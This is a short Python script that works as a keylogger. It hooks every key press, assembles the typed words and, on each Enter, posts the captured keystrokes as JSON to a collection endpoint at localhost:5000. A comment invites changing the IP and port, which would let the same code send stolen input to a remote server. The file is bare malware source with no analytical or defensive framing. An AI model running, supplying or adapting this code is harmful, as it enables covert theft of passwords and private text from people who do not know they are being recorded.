import threading
import requests
import keyboard

log = []
word = ""
interval = 10

def send_log_periodically():
    return

def send_log(event):
    global log, word
    key = event.name
    if key in ['space', 'tab']:
        if word:
            log.append(word)
            word = ""
            log.append(" ")
    elif key == 'enter':
        if word:
            log.append(word)
            word = ""
        data = {'keystrokes': ''.join(log)}
        try:
            # Local server test, change the ip and port as needed
            requests.post('http://localhost:5000/keylog', json=data)
        except:
            pass
        log.clear()
    elif key in ['shift', 'ctrl', 'alt', 'esc']:
        pass
    elif len(key) == 1:
        word += key
    elif key == 'backspace':
        word = word[:-1]

keyboard.on_press(send_log)
keyboard.wait()